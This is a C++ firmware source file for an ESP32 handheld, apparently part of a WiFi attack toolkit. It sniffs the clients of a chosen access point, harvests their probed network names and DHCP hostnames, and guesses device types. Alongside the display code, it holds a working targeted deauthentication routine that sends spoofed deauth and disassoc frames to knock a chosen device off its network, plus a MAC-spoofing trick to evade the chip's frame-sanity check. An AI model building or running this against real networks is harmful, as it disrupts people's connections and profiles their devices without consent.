/*
 * wifi_clients — list STA clients connected to a target AP.
 *
 * Locks channel to the target AP, listens for data frames going to or
 * from that BSSID, extracts the STA MAC(s). Shows a live table of
 * seen clients with last-seen timestamp and RSSI.
 *
 * Press D on a highlighted client to deauth just that one (unicast
 * deauth to the client MAC spoofed-from the AP).
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_types.h"
#include "wifi_deauth_frame.h"
#include "ble_db.h"
#include "dhcp_cache.h"
#include <WiFi.h>
#include <esp_wifi.h>

#define MAX_CLIENTS 16
#define CLI_SSID_MAX 5     /* probed SSIDs (broadcast names) kept per client */

struct cli_t {
    uint8_t  mac[6];
    int8_t   rssi;
    uint32_t last_seen;
    uint32_t frames;
    /* #B1b: SSIDs this client has broadcast probe-requests for — its
     * preferred-network list. Reveals what networks it auto-joins. */
    char     ssids[CLI_SSID_MAX][33];
    uint8_t  ssid_n;
};

static cli_t    s_clients[MAX_CLIENTS];
static volatile int s_count = 0;
static uint8_t  s_target[6];
static uint8_t  s_target_ch = 1;

/* Find a tracked client by MAC, or add it. Returns index or -1 if full.
 * Caller must already hold whatever serialization applies (this runs
 * single-threaded in the WiFi RX task). */
static int cli_find_or_add(const uint8_t *mac)
{
    for (int i = 0; i < s_count; ++i)
        if (memcmp(s_clients[i].mac, mac, 6) == 0) return i;
    if (s_count >= MAX_CLIENTS) return -1;
    /* Data-race fix: fully populate the fresh slot BEFORE publishing the
     * count, so the UI task (which reads up to s_count) never sees a
     * half-written row. Publish s_count last. */
    int idx = s_count;
    memset(&s_clients[idx], 0, sizeof(s_clients[idx]));
    memcpy(s_clients[idx].mac, mac, 6);
    s_count = idx + 1;
    return idx;
}

/* #B1b: record an SSID this client probed for, if not already stored. */
static void cli_add_probed_ssid(int idx, const char *ssid)
{
    if (idx < 0 || !ssid[0]) return;
    cli_t &c = s_clients[idx];
    for (int i = 0; i < c.ssid_n; ++i)
        if (strcmp(c.ssids[i], ssid) == 0) return;   /* dup */
    if (c.ssid_n >= CLI_SSID_MAX) return;             /* list full */
    strncpy(c.ssids[c.ssid_n], ssid, 32);
    c.ssids[c.ssid_n][32] = '\0';
    c.ssid_n++;
}

/* Capture data frames going to/from our target BSSID, AND probe-requests
 * from any client (to harvest its preferred-network list). */
static void client_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;

    /* #B1b: probe requests (MGMT subtype 0x4) reveal the SSIDs a client
     * is looking for. Source MAC = p+10. Tagged SSID at offset 24. */
    if (type == WIFI_PKT_MGMT && pkt->rx_ctrl.sig_len >= 26 &&
        ((p[0] >> 4) & 0xF) == 0x4) {
        const uint8_t *src = p + 10;
        uint8_t tag_id  = p[24];
        uint8_t tag_len = p[25];
        if (tag_id == 0 && tag_len > 0 && tag_len <= 32 &&
            pkt->rx_ctrl.sig_len >= 26U + tag_len) {
            char ssid[33];
            memcpy(ssid, p + 26, tag_len);
            ssid[tag_len] = '\0';
            bool ok = true;
            for (uint8_t i = 0; i < tag_len; ++i)
                if (ssid[i] < 0x20 || ssid[i] == 0x7F) { ok = false; break; }
            if (ok) {
                int idx = cli_find_or_add(src);
                if (idx >= 0) {
                    s_clients[idx].rssi      = pkt->rx_ctrl.rssi;
                    s_clients[idx].last_seen = millis();
                    cli_add_probed_ssid(idx, ssid);
                }
            }
        }
        return;
    }

    if (type != WIFI_PKT_DATA) return;
    if (pkt->rx_ctrl.sig_len < 24) return;

    uint8_t fc = p[1];
    uint8_t from_ds = (fc >> 1) & 1;
    uint8_t to_ds   = (fc)      & 1;

    const uint8_t *bssid;
    const uint8_t *sta;
    if (to_ds && !from_ds) {        /* STA → AP: addr1=BSSID, addr2=STA */
        bssid = p + 4;  sta = p + 10;
    } else if (from_ds && !to_ds) { /* AP → STA: addr1=STA, addr2=BSSID */
        bssid = p + 10; sta = p + 4;
    } else {
        return;
    }

    if (memcmp(bssid, s_target, 6) != 0) return;

    /* Try to scoop a hostname from DHCP on this frame. */
    dhcp_try_parse_802_11(p, pkt->rx_ctrl.sig_len);

    int idx = cli_find_or_add(sta);
    if (idx < 0) return;
    s_clients[idx].rssi      = pkt->rx_ctrl.rssi;
    s_clients[idx].last_seen = millis();
    s_clients[idx].frames++;
}

/* Targeted deauth: AP → STA (client), spoofed sender = AP.
 * Fires 30 deauth+disassoc pairs = 60 frames at ~5ms spacing.
 *
 * Spoofs STA MAC to target BSSID before TX so the stock ESP-IDF blob
 * doesn't drop every frame at ieee80211_raw_frame_sanity_check. */
static void deauth_client(const uint8_t *client)
{
    static uint16_t seq = 0;
    if (seq == 0) seq = (uint16_t)(esp_random() & 0x0FFF);

    wifi_silent_ap_begin(s_target_ch);
    for (int i = 0; i < 30; ++i) {
        wifi_deauth_pair(client, s_target, &seq);
        delay(5);
    }
    wifi_silent_ap_end();
}

/* #B1b: coarse device-type guess from the OUI vendor string + probed
 * SSID hints. Not authoritative — WiFi gives little to go on — but
 * enough to label "Apple phone" vs "printer" vs "IoT". */
static const char *client_device_type(const cli_t &c, const char *vendor)
{
    /* SSID hints first — strongest signal. */
    for (int i = 0; i < c.ssid_n; ++i) {
        const char *s = c.ssids[i];
        if (strncasecmp(s, "HP-Print", 8) == 0 ||
            strcasestr(s, "ENVY") || strcasestr(s, "OfficeJet")) return "Printer";
        if (strncasecmp(s, "DIRECT-", 7) == 0) return "Cast/Miracast";
        if (strcasestr(s, "Chromecast")) return "Chromecast";
        if (strcasestr(s, "Roku")) return "Roku TV";
    }
    if (!vendor) return "unknown";
    if (strcasestr(vendor, "Apple"))     return "Apple (iPhone/Mac)";
    if (strcasestr(vendor, "Samsung"))   return "Samsung phone/TV";
    if (strcasestr(vendor, "Google"))    return "Google/Android";
    if (strcasestr(vendor, "Amazon"))    return "Amazon (Echo/Fire)";
    if (strcasestr(vendor, "Xiaomi"))    return "Xiaomi device";
    if (strcasestr(vendor, "Espressif")) return "ESP IoT device";
    if (strcasestr(vendor, "Raspberry")) return "Raspberry Pi";
    if (strcasestr(vendor, "Intel"))     return "PC/laptop";
    if (strcasestr(vendor, "HP") || strcasestr(vendor, "Hewlett") ||
        strcasestr(vendor, "Canon") || strcasestr(vendor, "Epson") ||
        strcasestr(vendor, "Brother")) return "Printer";
    if (strcasestr(vendor, "Sony"))      return "Sony device";
    if (strcasestr(vendor, "Microsoft")) return "Microsoft device";
    return vendor;   /* fall back to raw vendor name */
}

/* #B1: per-client detail + action screen. Full MAC, device type,
 * vendor (OUI), probed SSIDs (broadcast names), hostname, signal,
 * frames, age, AP. D=deauth. ESC=back; re-arms promisc on exit. */
static void client_detail(int idx)
{
    auto &d = M5Cardputer.Display;
    bool redraw = true;
    uint32_t last = 0;
    while (true) {
        uint32_t now = millis();
        if (redraw || now - last > 500) {
            redraw = false;
            last = now;
            /* snapshot the row (cb may still be updating fields). Plain
             * copy — the cb only writes scalar fields, worst case is a
             * stale rssi/frames for one frame, no torn pointer. */
            cli_t c = s_clients[idx];

            ui_force_clear_body();
            d.setTextColor(T_ACCENT, T_BG);
            d.setCursor(4, BODY_Y + 2); d.print("CLIENT DETAIL");
            d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);

            uint32_t oui = ((uint32_t)c.mac[0] << 16) |
                           ((uint32_t)c.mac[1] << 8)  | c.mac[2];
            const char *vendor = (c.mac[0] & 0x02) ? nullptr : ble_db_oui(oui);
            const char *dtype  = client_device_type(c, vendor);

            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 14);
            d.printf("%02X:%02X:%02X:%02X:%02X:%02X",
                     c.mac[0], c.mac[1], c.mac[2], c.mac[3], c.mac[4], c.mac[5]);
            if (c.mac[0] & 0x02) {
                d.setTextColor(T_DIM, T_BG); d.print(" (rnd)");
            }

            /* Device type — the headline read. */
            d.setTextColor(T_ACCENT2, T_BG);
            d.setCursor(4, BODY_Y + 25);
            d.printf("TYPE %.33s", dtype);

            /* Raw vendor (or hostname if DHCP caught one). */
            const char *host = dhcp_hostname(c.mac);
            d.setTextColor(host && host[0] ? T_GOOD : T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 36);
            if (host && host[0]) d.printf("HOST %.33s", host);
            else                 d.printf("VEN  %.33s", vendor ? vendor : "unknown");

            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 47);
            uint32_t age = (now - c.last_seen) / 1000;
            d.printf("RSSI %d  frm %lu  %lus  ch%u",
                     c.rssi, (unsigned long)c.frames,
                     (unsigned long)age, s_target_ch);

            /* Probed SSIDs — the broadcast names this client looks for. */
            d.setTextColor(T_ACCENT, T_BG);
            d.setCursor(4, BODY_Y + 60);
            d.printf("PROBES (%u):", c.ssid_n);
            d.setTextColor(T_FG, T_BG);
            if (c.ssid_n == 0) {
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(78, BODY_Y + 60);
                d.print("none seen yet");
            }
            for (int i = 0; i < c.ssid_n && i < 4; ++i) {
                d.setCursor(8, BODY_Y + 71 + i * 10);
                d.printf("- %.36s", c.ssids[i][0] ? c.ssids[i] : "<broadcast>");
            }

            ui_draw_footer("D=deauth  `=back");
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == 'd' || k == 'D') {
            deauth_client(s_clients[idx].mac);
            /* deauth_client tears promisc down — re-arm. */
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(client_cb);
            esp_wifi_set_channel(s_target_ch, WIFI_SECOND_CHAN_NONE);
            ui_toast("deauth sent", T_BAD, 700);
            redraw = true;
        }
    }
    /* Re-arm on exit so the list keeps updating. */
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(client_cb);
    esp_wifi_set_channel(s_target_ch, WIFI_SECOND_CHAN_NONE);
}

/* Paint the static list chrome (hline + AP SSID subtitle). Called once at
 * entry and again after any full-screen event (detail view, toast) that
 * overwrites it. The CLIENTS header count is repainted on the data path. */
static void draw_client_chrome(void)
{
    auto &d = M5Cardputer.Display;
    ui_force_clear_body();
    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 14);
    d.printf("%.24s", g_last_selected_ap.ssid);
}

/* Paint one client row in full: own full-width background (so the prior
 * row's pixels are overwritten without a body clear), then all fields on
 * top. Used by both the cursor-move and window-scroll redraw paths. */
static void draw_client_row(int r, int first, int cursor)
{
    auto &d = M5Cardputer.Display;
    const cli_t &c = s_clients[first + r];
    int y = BODY_Y + 28 + r * 11;
    bool sel = (first + r == cursor);
    uint16_t bg = sel ? 0x18C7 : T_BG;
    d.fillRect(0, y - 1, SCR_W, 11, bg);

    uint32_t oui = ((uint32_t)c.mac[0] << 16) |
                   ((uint32_t)c.mac[1] << 8) |
                    (uint32_t)c.mac[2];
    bool randomized = (c.mac[0] & 0x02) != 0;
    /* Don't OUI-lookup randomized MACs — the bytes are
     * arbitrary so any "match" is a false positive. */
    const char *vendor   = randomized ? nullptr : ble_db_oui(oui);
    const char *hostname = dhcp_hostname(c.mac);

    /* Hostname wins, then real-MAC vendor, then a
     * "random" tag for privacy MACs, then "?". */
    if (hostname) {
        d.setTextColor(sel ? T_ACCENT : T_GOOD, bg);
        d.setCursor(4, y); d.printf("%-14.14s", hostname);
    } else if (vendor) {
        d.setTextColor(sel ? T_ACCENT : T_WARN, bg);
        d.setCursor(4, y); d.printf("%-14.14s", vendor);
    } else if (randomized) {
        d.setTextColor(sel ? T_ACCENT : T_DIM, bg);
        d.setCursor(4, y); d.printf("%-14.14s", "~random");
    } else {
        d.setTextColor(T_DIM, bg);
        d.setCursor(4, y); d.print("?");
    }
    d.setTextColor(sel ? T_ACCENT : T_FG, bg);
    d.setCursor(90, y);
    d.printf("%02X:%02X:%02X", c.mac[3], c.mac[4], c.mac[5]);
    d.setTextColor(T_DIM, bg);
    d.setCursor(146, y);
    d.printf("%3d %lu", c.rssi, (unsigned long)c.frames);
}

void feat_wifi_clients(void)
{
    radio_switch(RADIO_WIFI);
    /* Lean STA init — fits in fragmented DMA RAM. Idempotent. */
    wifi_lean_sta_init();

    if (!g_last_selected_valid) {
        ui_toast("scan + select AP first", T_WARN, 1500);
        return;
    }
    memcpy(s_target, g_last_selected_ap.bssid, 6);
    s_target_ch = g_last_selected_ap.channel ? g_last_selected_ap.channel : 1;

    static int s_saved_cursor = 0;
    static uint8_t s_saved_for[6] = {0};
    /* Only clear the client list if we're looking at a different AP. */
    if (memcmp(s_saved_for, s_target, 6) != 0) {
        s_count = 0;
        s_saved_cursor = 0;
        memcpy(s_saved_for, s_target, 6);
    }
    /* Explicit MASK_ALL filter — passing nullptr to the filter setter
     * on IDF 5.5 silently disables capture (we hit this in Triton). */
    static const wifi_promiscuous_filter_t s_all_filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&s_all_filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(client_cb);
    esp_wifi_set_channel(s_target_ch, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[clients] entry ch=%u target=%02X:%02X:%02X:%02X:%02X:%02X\n",
                  s_target_ch, s_target[0], s_target[1], s_target[2],
                  s_target[3], s_target[4], s_target[5]);

    int cursor = s_saved_cursor;
    ui_draw_footer(";/.move ENTER=info D=deauth `=back");

    /* Static chrome painted once at entry; the body never gets a blanket
     * clear after this, so scrolling no longer flashes black. */
    draw_client_chrome();

    uint32_t last = 0;
    /* Each row owns its background and repaints incrementally:
     *   - count changed  → repaint header + visible rows
     *   - window (first) changed → repaint visible rows
     *   - cursor-only move within window → repaint old + new rows
     *   - timer tick → overwrite only the volatile RSSI/frames cells
     * The promiscuous callback bumps s_count as new MACs appear. */
    int last_count  = -1;
    int last_cursor = -1;
    int last_first  = -1;
    while (true) {
        const int rows = 7;
        int first = 0;
        if (s_count > 0) {
            if (cursor < 0) cursor = 0;
            if (cursor >= s_count) cursor = s_count - 1;
            first = cursor - rows / 2;
            if (first < 0) first = 0;
            if (first + rows > s_count) first = max(0, s_count - rows);
        }
        bool count_changed  = (s_count != last_count);
        bool cursor_changed = (cursor != last_cursor);
        bool first_changed  = (first != last_first);
        bool changed = count_changed || cursor_changed || first_changed;
        if (changed || millis() - last > 1000) {
            last = millis();
            auto &d = M5Cardputer.Display;
          if (changed) {
            if (count_changed) {
                ui_text_w(4, BODY_Y + 2, SCR_W - 8, T_ACCENT,
                          "CLIENTS  %d  ch%u", s_count, s_target_ch);
            }

            if (s_count == 0) {
                if (count_changed) {
                    d.fillRect(0, BODY_Y + 28, SCR_W, BODY_H - 28, T_BG);
                    d.setTextColor(T_DIM, T_BG);
                    d.setCursor(4, BODY_Y + 34);
                    d.print("no traffic yet. waiting...");
                    d.setCursor(4, BODY_Y + 46);
                    d.print("try running deauth to");
                    d.setCursor(4, BODY_Y + 58);
                    d.print("force reconnects.");
                }
            } else if (count_changed || first_changed) {
                /* Window scrolled or list grew — repaint every visible
                 * row over its own background, no body clear. */
                for (int r = 0; r < rows && first + r < s_count; ++r)
                    draw_client_row(r, first, cursor);
            } else {
                /* Cursor moved within the same window — repaint only the
                 * old and new selected rows. */
                int old_r = last_cursor - first;
                int new_r = cursor - first;
                if (old_r >= 0 && old_r < rows && last_first + old_r < s_count)
                    draw_client_row(old_r, first, cursor);
                if (new_r >= 0 && new_r < rows && first + new_r < s_count)
                    draw_client_row(new_r, first, cursor);
            }
            last_count  = s_count;
            last_cursor = cursor;
            last_first  = first;
          } else if (s_count > 0) {
            /* Timer tick, list unchanged — refresh only the volatile
             * RSSI/frames column so the table doesn't strobe. */
            for (int r = 0; r < rows && first + r < s_count; ++r) {
                const cli_t &c = s_clients[first + r];
                int y = BODY_Y + 28 + r * 11;
                bool sel = (first + r == cursor);
                uint16_t bg = sel ? 0x18C7 : T_BG;
                d.fillRect(146, y, SCR_W - 146 - 2, 10, bg);
                d.setTextColor(T_DIM, bg);
                d.setCursor(146, y);
                d.printf("%3d %lu", c.rssi, (unsigned long)c.frames);
            }
          }
            ui_draw_status(radio_name(), "clients");
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { if (cursor + 1 < s_count) cursor++; }
        if (k == PK_ENTER && s_count > 0 && cursor < s_count) {
            /* #B1: open the per-client detail + action screen. */
            client_detail(cursor);
            /* detail view overwrote our chrome — repaint it and force a
             * full list rebuild on return. */
            draw_client_chrome();
            last_count = last_cursor = last_first = -1;
        }
        if ((k == 'd' || k == 'D') && s_count > 0 && cursor < s_count) {
            deauth_client(s_clients[cursor].mac);
            /* wifi_silent_ap_end() inside deauth_client tears WiFi down
             * to STA + promisc=false. Re-arm so the client sniffer
             * keeps populating the table after the deauth returns. */
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(client_cb);
            esp_wifi_set_channel(s_target_ch, WIFI_SECOND_CHAN_NONE);
            ui_toast("deauth sent", T_BAD, 600);
            /* toast covered the body — repaint chrome + force full redraw. */
            draw_client_chrome();
            last_count = last_cursor = last_first = -1;
        }
    }

    esp_wifi_set_promiscuous(false);
    s_saved_cursor = cursor;
}
